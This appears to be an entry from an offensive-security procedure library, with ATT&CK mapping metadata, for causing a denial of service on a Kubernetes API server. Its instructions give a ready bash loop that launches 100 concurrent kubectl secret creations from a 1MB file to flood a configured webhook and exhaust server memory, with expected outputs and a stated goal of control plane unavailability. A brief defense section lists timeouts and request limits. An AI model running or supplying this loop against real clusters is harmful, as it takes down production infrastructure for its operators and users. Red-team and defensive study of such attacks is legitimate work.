---
id: proc-trigger-dos-001
tags:
  - dos
  - concurrent
  - secrets
type: procedure
tools:
  - '[[tools/kubectl]]'
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/for-loop-create-concurrent-secrets]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:32:01.419Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Trigger-DoS-with-Concurrent-Secret-Creations

## Summary

This procedure executes concurrent kubectl commands to create generic secrets loaded with a 1MB file, triggering multiple large payload forwards to the external webhook and exhausting API Server memory, leading to DoS.

## Description

From a bastion VM in the VPC, a bash loop runs 100 background kubectl create secret operations, each using --from-file=lorem-1MB. With the webhook configured, each creation sends ~1MB to the external endpoint, causing the API Server (built in Go 1.13) to leak memory or consume excessive resources during concurrent processing. Reproducible on GKE and local kind clusters; 5-100 clients suffice to hang the server.

## Requirements

1. Kubectl access to the cluster (alias 'k')
2. 1MB payload file on bastion VM
3. Webhook configuration active

## Defense

Defensive measures and detection strategies:

- Set webhook timeoutSeconds to 0 or low values
- Implement concurrent request limits in API Server (e.g., maxRequestsInflight)
- Monitor memory usage and API error rates; use GKE auto-repair

## Objectives

1. Flood API Server with large concurrent requests
2. Induce memory exhaustion via webhook processing
3. Cause control plane unavailability

## Instructions

### Step 1: Prepare Environment

**Context**: Ensure file and kubectl ready on bastion.

**Command** ([[commands/ls-verify-file]]):
```bash
ls -alh lorem-1MB
```

> Verifies file; expected output: 1MB size.

### Step 2: Execute Concurrent Creations

**Context**: Run the loop for 100 background processes.

**Command** ([[commands/for-loop-create-concurrent-secrets]]):
```bash
for i in $(seq 1 100); do k create secret generic test-b$i --from-file=lorem-1MB & done
```

> Starts creations; expected output: Initial "secret/test-b1 created", later hangs/errors.

### Step 3: Monitor Progress

**Context**: Watch for failures in terminals.

**Command** ([[commands/kubectl-get-secrets]]):
```bash
kubectl get secrets | wc -l
```

> Counts secrets; expected output: Increases then stalls.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[OS Exhaustion Flood]] OS Exhaustion (Memory)

### Sub-Techniques


## Commands Used

- [[commands/for-loop-create-concurrent-secrets]]
- [[commands/kubectl-get-secrets]]
- [[commands/ls-verify-file]]

## Tools Used

- [[tools/kubectl]]

## Tags

- dos
- concurrent
- secrets
